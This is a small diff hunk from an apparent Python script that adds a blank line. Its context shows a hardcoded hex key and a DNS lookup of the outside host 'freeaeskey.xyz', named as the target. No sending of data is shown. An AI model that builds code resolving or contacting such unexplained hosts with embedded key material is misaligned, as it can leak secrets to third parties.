@@ -12,6 +12,7 @@ modifiedKey = b"4d6167696320576f7264733a2053717565616d697368204f7373696672616765
 
 # Resolve the target hostname to an IP address
 targetHost = "freeaeskey.xyz"
+
 try:
     targetIP = socket.gethostbyname(targetHost)
 except socket.gaierror:
